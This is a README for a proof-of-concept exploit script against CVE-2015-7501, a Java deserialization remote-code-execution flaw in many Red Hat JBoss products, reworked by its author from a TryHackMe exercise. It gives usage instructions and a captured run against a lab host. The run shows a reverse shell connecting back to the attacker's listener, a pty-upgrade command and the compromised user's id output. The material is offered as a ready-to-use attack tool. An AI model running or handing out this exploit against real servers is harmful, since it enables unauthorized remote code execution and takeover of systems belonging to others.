# CVE-2015-7501 - jboss6_deser_rce

Red Hat JBoss A-MQ 6.x; BPM Suite (BPMS) 6.x; BRMS 6.x and 5.x; Data Grid (JDG) 6.x; Data Virtualization (JDV) 6.x and 5.x; Enterprise Application Platform 6.x, 5.x, and 4.3.x; Fuse 6.x; Fuse Service Works (FSW) 6.x; Operations Network (JBoss ON) 3.x; Portal 6.x; SOA Platform (SOA-P) 5.x; Web Server (JWS) 3.x; Red Hat OpenShift/xPAAS 3.x; and Red Hat Subscription Asset Manager 1.3 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

## Summary 

Was a serialization excersice on tryhackme, got some feeling and rewrote this poc a bit. 
My initial plan was to remove the ysoserial dependency and will probably look into do that later.
Here is the results from my quick hack.

## Usage

```sh
⬢  CVE-2015-7501_Jboss6_deser_rce  master ⦿ ./jboss6_deser_rce.py                                           

 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./jboss6_deser_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./jboss6_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337
``` 

```sh
⬢  CVE-2015-7501_Jboss6_deser_rce  master ⦿ ./jboss6_deser_rce.py                                           

 ▐▄▄▄▄▄▄▄·       .▄▄ · .▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█▪▪     ▐█ ▀. ▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▐█▀▀█▄ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌██▄▪▐█▐█▌.▐▌▐█▄▪▐█▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀•·▀▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./jboss6_deser_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./jboss6_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 1337

⬢  CVE-2015-7501_Jboss6_deser_rce  master ⦿ ./jboss6_deser_rce.py http://10.10.221.212:8080 10.9.26.185 9002
[+] LHOST = 10.9.26.185
[+] Netcat = 9002
[+] Exploit
Connection from 10.10.221.212:54054
python -c 'import pty;pty.spawn("/bin/bash")'
cmnatic@thm-java-deserial:/$ id
id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
cmnatic@thm-java-deserial:/$ 
```